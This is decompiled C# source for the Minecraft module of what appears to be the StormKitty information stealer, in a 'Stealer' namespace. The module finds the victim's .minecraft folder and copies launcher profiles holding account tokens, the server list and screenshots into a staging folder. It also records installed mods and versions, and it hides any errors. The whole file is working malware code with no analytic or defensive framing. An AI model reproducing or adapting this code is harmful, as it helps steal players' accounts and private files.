﻿using System;
using System.IO;
using StormKitty;

namespace Stealer
{
	// Token: 0x0200001A RID: 26
	internal sealed class Minecraft
	{
		// Token: 0x0600007C RID: 124 RVA: 0x00004888 File Offset: 0x00002A88
		private static void SaveVersions(string sSavePath)
		{
			foreach (string path in Directory.GetDirectories(Path.Combine(Minecraft.MinecraftPath, "versions")))
			{
				string name = new DirectoryInfo(path).Name;
				string text = Filemanager.DirectorySize(path).ToString() + " bytes";
				string text2 = Directory.GetCreationTime(path).ToString("yyyy-MM-dd h:mm:ss tt");
				File.AppendAllText(sSavePath + "\\versions.txt", string.Concat(new string[]
				{
					"VERSION: ",
					name,
					"\n\tSIZE: ",
					text,
					"\n\tDATE: ",
					text2,
					"\n\n"
				}));
			}
		}

		// Token: 0x0600007D RID: 125 RVA: 0x00004944 File Offset: 0x00002B44
		private static void SaveMods(string sSavePath)
		{
			foreach (string text in Directory.GetFiles(Path.Combine(Minecraft.MinecraftPath, "mods")))
			{
				string fileName = Path.GetFileName(text);
				string text2 = new FileInfo(text).Length.ToString() + " bytes";
				string text3 = File.GetCreationTime(text).ToString("yyyy-MM-dd h:mm:ss tt");
				File.AppendAllText(sSavePath + "\\mods.txt", string.Concat(new string[]
				{
					"MOD: ",
					fileName,
					"\n\tSIZE: ",
					text2,
					"\n\tDATE: ",
					text3,
					"\n\n"
				}));
			}
		}

		// Token: 0x0600007E RID: 126 RVA: 0x00004A00 File Offset: 0x00002C00
		private static void SaveScreenshots(string sSavePath)
		{
			string[] files = Directory.GetFiles(Path.Combine(Minecraft.MinecraftPath, "screenshots"));
			if (files.Length == 0)
			{
				return;
			}
			Directory.CreateDirectory(sSavePath + "\\screenshots");
			foreach (string text in files)
			{
				File.Copy(text, sSavePath + "\\screenshots\\" + Path.GetFileName(text));
			}
		}

		// Token: 0x0600007F RID: 127 RVA: 0x00004A64 File Offset: 0x00002C64
		private static void SaveServers(string sSavePath)
		{
			string text = Path.Combine(Minecraft.MinecraftPath, "servers.dat");
			if (!File.Exists(text))
			{
				return;
			}
			File.Copy(text, sSavePath + "\\servers.dat");
		}

		// Token: 0x06000080 RID: 128 RVA: 0x00004A9C File Offset: 0x00002C9C
		private static void SaveProfiles(string sSavePath)
		{
			string text = Path.Combine(Minecraft.MinecraftPath, "launcher_profiles.json");
			if (!File.Exists(text))
			{
				return;
			}
			File.Copy(text, sSavePath + "\\launcher_profiles.json");
		}

		// Token: 0x06000081 RID: 129 RVA: 0x00004AD4 File Offset: 0x00002CD4
		public static void SaveAll(string sSavePath)
		{
			if (!Directory.Exists(Minecraft.MinecraftPath))
			{
				return;
			}
			try
			{
				Directory.CreateDirectory(sSavePath);
				Minecraft.SaveProfiles(sSavePath);
				Minecraft.SaveServers(sSavePath);
				Minecraft.SaveScreenshots(sSavePath);
				Minecraft.SaveMods(sSavePath);
				Minecraft.SaveVersions(sSavePath);
			}
			catch
			{
			}
		}

		// Token: 0x0400006B RID: 107
		private static string MinecraftPath = Path.Combine(Paths.appdata, ".minecraft");
	}
}
